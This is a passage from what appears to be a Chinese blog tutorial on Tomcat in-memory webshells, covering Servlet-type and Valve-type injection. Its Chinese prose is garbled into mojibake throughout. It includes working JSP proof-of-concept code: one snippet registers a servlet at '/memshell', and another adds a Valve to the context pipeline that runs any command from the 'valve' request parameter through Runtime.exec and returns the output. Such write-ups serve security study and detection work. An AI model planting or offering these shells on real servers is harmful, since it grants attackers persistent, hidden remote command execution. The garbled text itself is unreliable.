</span></span></code></pre></div><p>Êé•ÁùÄÊàë‰ª¨ÂÖàËÆøÈóÆjspÊñá‰ª∂Êù•Âä®ÊÄÅServletÔºåÁÑ∂ÂêéÂÜçËÆøÈóÆÂπ∂ÈôÑÂä†‰∏äÊÉ≥Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§Â∞±ÂèØ‰ª•‰∫ÜÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_16-07-07_screenshot.png"
         alt="Figure 8: ClassNotFoundExceptionÂºÇÂ∏∏" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 8: <!-- raw HTML omitted -->ClassNotFoundExceptionÂºÇÂ∏∏</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>Âá∫Áé∞‰∫ÜClassNotFoundExceptionÂºÇÂ∏∏ÔºüÊàë‰ª¨Êù•ÁúãË∞ÉÁî®Ê†àÔºåÊúÄÂêé‰∏Ä‰∏™ÊñπÊ≥ïÊòØ <code>loadClass()</code>, ËøôÊòØÂú®ÂèçÂ∞ÑÂæóÂà∞Ëá™ÂÆö‰πâServletÁ±ªÊó∂ÂèëÁîü‰∫ÜÈîôËØØÔºåÂéüÂõ†‰πüÂæàÁÆÄÂçïÔºåÂ∞±ÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÂä†ËΩΩÁöÑÁ±ªÊòØ <strong>org.apache.jsp.MemShellServlet_jsp$MemShellServlet</strong>, ËøôÊòØ‰∏Ä‰∏™‰ΩøÁî® <code>&lt;%!</code> Ê†áÁ≠æÂÆö‰πâÂú®JSPÊñá‰ª∂ÂÜÖÈÉ®ÁöÑÁ±ªÔºåÊó†Ê≥ïË¢´Â§ñÈÉ®ÊâÄËÆøÈóÆÔºåÊâçÂØºËá¥‰∫ÜÂèçÂ∞ÑÂºÇÂ∏∏„ÄÇ <!-- raw HTML omitted --></p>
<p>Âõ†Ê≠§ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÊâãÂä®‰∏∫standardWrapperÊ∑ªÂä†‰∏äservletÂÆû‰æãÂç≥ÂèØÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÁªïËøáÂèçÂ∞ÑËøô‰∏™Ê≠•È™§ÔºåÊÑüÂÖ¥Ë∂£ÁöÑËØªËÄÖÂèØ‰ª•ÂéªÁ†îÁ©∂‰∏Ä‰∏ã  <code>StandardWrapper#allocate</code> ÊñπÊ≥ïÔºåËøôÈáåÂ∞±‰∏çÊ∑±ÂÖ•‰∫Ü„ÄÇ <!-- raw HTML omitted --></p>
<p>‰øÆÊîπÁöÑPOCÂ¶Ç‰∏ãÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. ÂàõÂª∫‰∏Ä‰∏™StandardContextÂØπË±°Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. ÂàõÂª∫‰∏Ä‰∏™StandardWrapperÂØπË±°Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MemShellServlet</span> <span class="n">memShellServlet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellServlet</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardWrapper</span> <span class="n">standardWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StandardWrapper</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">servlet_name</span> <span class="o">=</span> <span class="n">memShellServlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">memShellServlet</span><span class="o">);</span>    <span class="c1">// ÁªïËøáÂèçÂ∞ÑÁîüÊàêServletÂÆû‰æãÁöÑÊ≠•È™§
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">memShellServlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 3. Â∞ÜStandardWrapperÂä†ÂÖ•StandardContext‰∏≠Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">standardWrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="s">&#34;/memshell&#34;</span><span class="o">,</span> <span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><p>ÊúÄÂêéÂÖàËÆøÈóÆMemShellServlet.jspÊ≥®ÂÜåServletÔºåÊé•ÁùÄËÆøÈóÆÈ™åËØÅÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_16-47-57_screenshot.png"
         alt="Figure 9: ServletÂÜÖÂ≠òÈ©¨Ê≥®ÂÖ•ÊàêÂäü" width="500px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 9: <!-- raw HTML omitted -->ServletÂÜÖÂ≠òÈ©¨Ê≥®ÂÖ•ÊàêÂäü</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h2 id="valveÂûã">ValveÂûã</h2>
<p>Áªà‰∫éÊù•Âà∞Êú¨ÊñáË¶Å‰ªãÁªçÁöÑÊúÄÁªà‰∏ÄÁßçTomcatÂÜÖÂ≠òÈ©¨Á±ªÂûã‰∫ÜÔºåÂÖ≥‰∫éValveÂûãÂÜÖÂ≠òÈ©¨ÁöÑÂà©Áî®ÊØîËæÉÁÆÄÂçïÔºåÊàë‰ª¨Â∞±Á®çÂæÆÂõûÈ°æË°•ÂÖÖ‰∏ÄÁÇπÊúâÂÖ≥TomcatÁöÑ <strong>Pipeline-Valve</strong> Ë¥£‰ªªÈìæÁöÑÂÜÖÂÆπÔºå‰∏ªË¶Å‰πüÊòØÁúãÂà∞‰∏Ä‰∫õÊñáÁ´†‰∏≠Âá∫Áé∞‰∫ÜË∞¨ËØØÊÉ≥Ë¶ÅÂÜçÊ¨°Á∫†Ê≠£Ôºõ <!-- raw HTML omitted --></p>
<h4 id="pipeline-valve-ÁÆ°ÈÅì-ÈòÄÈó®Ë¥£‰ªªÈìæÁÆÄ‰ªã">Pipeline-Valve ÁÆ°ÈÅì-ÈòÄÈó®Ë¥£‰ªªÈìæÁÆÄ‰ªã</h4>
<p>Êàë‰ª¨ÁúãÂõæËØ¥ËØùÔºå‰∏ãÈù¢ÁöÑÂõæ‰æãÂ±ïÁ§∫‰∫ÜTomcatÂØπ‰∫é‰∏ÄÊ¨°Êù•Ëá™ÂÆ¢Êà∑Á´ØÁöÑHTTPËØ∑Ê±ÇÁöÑÂ§ÑÁêÜÔºåÁî±ConnectorËøûÊé•Âô®Â∞ÅË£ÖÊàêRequest‰ª•ÂèäResponseÂØπË±°Âêé‰∫§Áî±ContainerÁöÑÂõõÁßçÂÆπÂô®ËøõË°åÂ§ÑÁêÜÔºõ <!-- raw HTML omitted --></p>
<p>ContainerÈááÁî®‰∫Ü <code>Pipleline-Valve Ë¥£‰ªªÈìæ</code> Êú∫Âà∂ÔºåÂç≥Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>
<p>ÊØè‰∏Ä‰∏™ÂÆπÂô®ÂØπË±°Ôºå‰ªéEngineÂà∞WrapperÔºåÈÉΩ <code>Áã¨Á´ã</code> Áª¥Êä§‰∏Ä‰∏™PiplelineÂØπË±°ÔºàËÄå‰∏çÊòØÂæàÂ§öÊñáÁ´†Âè£ËÄ≥Áõ∏‰º†ÁöÑÂÖ±ÂêåÁª¥Êä§‰∏Ä‰∏™ÂØπË±°ÔºâÔºåÂÖ∂‰∏≠ÂåÖÂê´Ëã•Âπ≤ÁöÑValveÂØπË±°ÔºåËøô‰∫õValveÊòØÁî®Êù•Ë°®Á§∫ËØ•ÂÆπÂô®ÂØπ‰∫éËØ∑Ê±ÇÊâÄËøõË°åÁöÑ‰∏ÄÁ≥ªÂàóÂ§ÑÁêÜÔºõ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_08-51-50_screenshot.png"
             alt="Figure 10: StandardContext‰∏≠ÁöÑpipeline" width="700px"/><figcaption>
                <p><!-- raw HTML omitted -->Figure 10: <!-- raw HTML omitted -->StandardContext‰∏≠ÁöÑpipeline</p>
            </figcaption>
    </figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_08-52-49_screenshot.png"
             alt="Figure 11: StandardWrapper‰∏≠ÁöÑpipeline" width="700px"/><figcaption>
                <p><!-- raw HTML omitted -->Figure 11: <!-- raw HTML omitted -->StandardWrapper‰∏≠ÁöÑpipeline</p>
            </figcaption>
    </figure>
 <!-- raw HTML omitted --></p>
</li>
<li>
<p>ÊØè‰∏Ä‰∏™ÂÆπÂô®ÁªìÊùüÂ§ÑÁêÜ‰πãÂêéÔºåÂ∞±‰ºöËé∑ÂèñÁõ∏Â∫îÁöÑÂ≠êÂÆπÂô®ÔºåÂπ∂ÂºÄÂßãÊâßË°åÂÖ∂Â≠êÂÆπÂô®ÁöÑpipeline‰∏≠ÁöÑvalveÊù•ÂØπËØ∑Ê±ÇËøõË°åËøõ‰∏ÄÊ≠•Â§ÑÁêÜÔºõ <!-- raw HTML omitted --></p>
</li>
</ol>
<p><figure><img src="/ox-hugo/2022-10-24_21-12-28_screenshot.png"
         alt="Figure 12: Pipleline-ValveË¥£‰ªªÈìæ" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 12: <!-- raw HTML omitted -->Pipleline-ValveË¥£‰ªªÈìæ</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>ËÄåÊàë‰ª¨ÁöÑÁõÆÁöÑÂ∞±ÊòØÂä®ÊÄÅÂú∞Ê≥®ÂÜå‰∏Ä‰∏™ValveÂØπË±°Ôºå‰ΩøTomcatÁöÑÂÆπÂô®‰ª¨ÂØπËØ∑Ê±ÇËøõË°åÂ§ÑÁêÜÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•Âú®Ë∞ÉÁî®ÈªòËÆ§ÁöÑBasic Valve‰πãÂâçÂÖàÊâßË°åÊàë‰ª¨ÊâÄÊ≥®ÂÜåÁöÑËá™ÂÆö‰πâ‰∏≠ÁöÑValve‰∏≠ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></p>
<p>ËøôÈáåÂÜçË°•ÂÖÖ‰∏Ä‰∫õÈªòËÆ§ÊÉÖÂÜµ‰∏ãÁöÑPipeline-Valve Ë¥£‰ªªÈìæÁöÑÂÆûÁé∞ÔºåTomcatÁöÑÂõõÁßçÂÆπÂô®ÔºàEngineÂà∞WrapperÔºâÂú®ÂàùÂßãÂåñÊó∂ÈÉΩ‰ºöË∞ÉÁî® <code>this.pipeline.setBasic([new Valve])</code> Êù•ËÆæÁΩÆÂÖ∂Áª¥Êä§ÁöÑPipeline‰∏≠ÁöÑÈªòËÆ§ <strong>Valve</strong>, ËØ•Vavle‰ºöË¢´ÊîæÂú®Êï¥‰∏™ Pipeline ÁöÑÊúÄÂêéÊù•ÊâßË°å„ÄÇ <!-- raw HTML omitted --></p>
<p>ËÄåÊàë‰ª¨ÊâÄÊ∑ªÂä†ÁöÑÊâÄÊúâ Valve ÈòÄÈó®ÈÉΩ‰ºöÂú®ÈªòËÆ§ÁöÑÂâçÈù¢Ë¢´ÊâßË°å„ÄÇ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nf">StandardEngine</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">pipeline</span><span class="o">.</span><span class="na">setBasic</span><span class="o">(</span><span class="k">new</span> <span class="n">StandardEngineValve</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">setJvmRoute</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;jvmRoute&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardEngine.jvmRouteFail&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">backgroundProcessorDelay</span> <span class="o">=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Êé•ÁùÄÊØè‰∏Ä‰∏™ ValveÈÉΩ‰ºöÈáçÂÜô <code>invoke()</code> ÊñπÊ≥ïÊù•ÊâßË°åËØ∑Ê±ÇÂ§ÑÁêÜÔºåÂú®ÈªòËÆ§ÁöÑVavleÔºàPipeline‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™VavleÔºâ‰∏≠ÔºåÂ∞±‰ºöË∞ÉÁî®Â≠êÂÆπÂô®ÁöÑPipeline‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ ValveÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span> <span class="kd">class</span> <span class="nc">StandardEngineValve</span> <span class="kd">extends</span> <span class="n">ValveBase</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">StringManager</span> <span class="n">sm</span> <span class="o">=</span> <span class="n">StringManager</span><span class="o">.</span><span class="na">getManager</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">StandardEngineValve</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Host</span> <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="n">400</span><span class="o">,</span> <span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardEngine.noHost&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">request</span><span class="o">.</span><span class="na">getServerName</span><span class="o">()}));</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">request</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="n">host</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">isAsyncSupported</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Ë∞ÉÁî®Â≠êÂÆπÂô®HostÁöÑPipeline‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ValveÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">host</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">getFirst</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="valveÂÜÖÂ≠òÈ©¨">ValveÂÜÖÂ≠òÈ©¨</h4>
<p>Êàë‰ª¨Â∑≤Áªè‰∫ÜËß£‰∫Ü‰∏Ä‰∏™ Valve ÁöÑ‰ΩúÁî®‰ª•ÂèäË∞ÉÁî®ÁöÑÊñπÊ≥ïÔºåÊàë‰ª¨Ë¶ÅÂä®ÊÄÅÂú∞Âä†ËΩΩ‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑValveÁöÑÊµÅÁ®ã‰πüÂëº‰πãÊ¨≤Âá∫Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>ÂàõÂª∫‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑValveÔºåÁªßÊâø ValveBaseÁ±ªÔºåÈáçÂÜôinvokeÊñπÊ≥ïÔºåÂÜôÂÖ•Êàë‰ª¨ÊÉ≥Ë¶ÅÊâßË°åÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></li>
<li>Ëé∑Âèñ‰ªªÊÑè‰∏Ä‰∏™Â≠êÂÆπÂô®ÁöÑpipelineÔºåÁÑ∂Âêé‰ΩøÁî®addValve()ÊñπÊ≥ïÊ∑ªÂä†Êàë‰ª¨ÁöÑValveÂÆû‰æãÂç≥ÂèØÔºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellValve</span> <span class="kd">extends</span> <span class="n">ValveBase</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;valve&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// ÂèØ‰ª•Ëá™Ë°åÂÜ≥ÂÆöÊòØÂê¶ÁªßÁª≠‰º†ÈÄíËØ∑Ê±ÇÂ§ÑÁêÜ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">this</span><span class="o">.</span><span class="na">getNext</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. ÂàõÂª∫‰∏Ä‰∏™StandardContextÂØπË±°;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. Â∞ÜËá™ÂÆö‰πâÁöÑValveÂÆû‰æãÊ∑ªÂä†Âà∞contextÁöÑpipeline‰∏≠;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">context</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">addValve</span><span class="o">(</span><span class="k">new</span> <span class="n">MemShellValve</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><p>ÊúÄÂêéÂÖàËÆøÈóÆJSPÊñá‰ª∂Ê≥®ÂÜåValveÔºåÊúÄÂêéÂÜçÂä†‰∏äÂèÇÊï∞È™åËØÅÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_16-50-49_screenshot.png"
         alt="Figure 13: ValveÂÜÖÂ≠òÈ©¨Ê≥®ÂÖ•ÊàêÂäü" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 13: <!-- raw HTML omitted -->ValveÂÜÖÂ≠òÈ©¨Ê≥®ÂÖ•ÊàêÂäü</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h2 id="ÂÜôÂú®ÊúÄÂêé">ÂÜôÂú®ÊúÄÂêé</h2>
<p>‰∏çÁü•‰∏çËßâÂèàÂÜô‰∫ÜËøô‰πàÂ§öÔºåÊî∂Ëé∑ËøòÊòØÂæàÂ§öÁöÑÔºåÂú®‰∏ä‰∏ÄÁØáÊñáÁ´†‰∏≠ÔºåÊàë‰ª•‰∏∫ÊàëÂ∑≤Áªè‰∫ÜËß£‰∫Ü‰∏âÂ§ßÁªÑ‰ª∂ÂÖ∑‰ΩìÊòØÂ¶Ç‰ΩïË¢´Âä†ËΩΩÔºåPipeline-ValveË¥£‰ªªÈìæÁöÑÂéüÁêÜ‰∫ÜÔºå‰ΩÜÊòØÂú®ÁúüÊ≠£ÂêëÂ§ßÂÆ∂‰ªãÁªçÂÖ∑‰ΩìÁöÑË∞ÉÁî®Ê†àÊó∂ÔºåËøòÊòØÈÅáÂà∞‰∫ÜÂæàÂ§öÁöÑÂõ∞ÈöæÔºõ <!-- raw HTML omitted --></p>
<p>ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÔºåÊú¨Êñá‰πüÊòØÂú®Á¨îËÄÖÈòÖËØª‰∫ÜÂæàÂ§öÂâçËæàÊÄªÁªìÁöÑÊñáÁ´†‰∏≠Â≠¶‰π†ÂêéÂÆûË∑µÊÄªÁªìÁöÑÁªìÊûúÔºå‰ΩÜÊòØÂú®ÂÆûË∑µÂ§çÁé∞ÁöÑËøáÁ®ã‰∏≠ÔºåËÉΩÂèëÁé∞‰∏Ä‰∫õÂâçËæà‰ª¨ÁöÑË∞¨ËØØÔºå‰∏™‰∫∫ËÆ§‰∏∫Ëøô‰∫õÈîôËØØÂèëÁîüÁöÑÂéüÂõ†ÂæàÊúâÂèØËÉΩÂ∞±ÊòØÂ§ßÂÆ∂Âú®Â≠¶‰π†Âà´‰∫∫ÁöÑÊñáÁ´†Êó∂ÔºåÂØπ‰∫é‰∏Ä‰∫õ‰∏çÈÇ£‰πàÈáçË¶ÅÁöÑÁªìËÆ∫ÔºåÂ∞±Áõ¥Êé•ÁÖßÊê¨ÔºåÂØºËá¥Âè£ËÄ≥Áõ∏‰º†ÔºåÂΩ¢Êàê‰∫Ü‰∏ÄÊù°ÈîôËØØÈìæ„ÄÇÁ©∂ÂÖ∂ÂéüÂõ†ÔºåËøòÊòØÊúÄÂàùÁöÑ‰ΩúËÄÖÁöÑ‰∏ç‰∏•Ë∞®ÊâÄÂØºËá¥ÁöÑÔºå‰∏™‰∫∫ËÆ§‰∏∫Âú®Á¢∞Âà∞Ëá™Â∑±‰∏çÁ°ÆÂÆöÂêåÊó∂ËÆ§‰∏∫Ê≤°ÊúâÂøÖË¶ÅËä±Êó∂Èó¥Ê∑±Á©∂ÁöÑÈóÆÈ¢ò‰∏äÔºåÂ∫îËØ•Â≠¶‰π†Âè∏È©¨ËøÅÂú®Âàõ‰Ωú„ÄäÂè≤ËÆ∞„ÄãÊó∂ÁöÑÊÄÅÂ∫¶Ôºå‚ÄúÂØπ‰∏Ä‰∫õÈöæ‰ª•ÂºÑÊ∏ÖÊ•öÁöÑÈóÆÈ¢òÔºåÊàñÈááÁî®ÈòôÁñëÁöÑÊÄÅÂ∫¶ÔºåÊàñËÆ∞ËΩΩÂêÑÁßç‰∏çÂêåÁöÑËØ¥Ê≥ï‚ÄùÔºåËÆ©Áü•ËØÜÁöÑ‰º†Êí≠Êõ¥‰∏∫‰ºòË¥®ÔºåÈÄ†Á¶èÊõ¥Â§öÁöÑ‰∫∫„ÄÇ <!-- raw HTML omitted --></p>
<h2 id="reference">Reference</h2>
<blockquote>
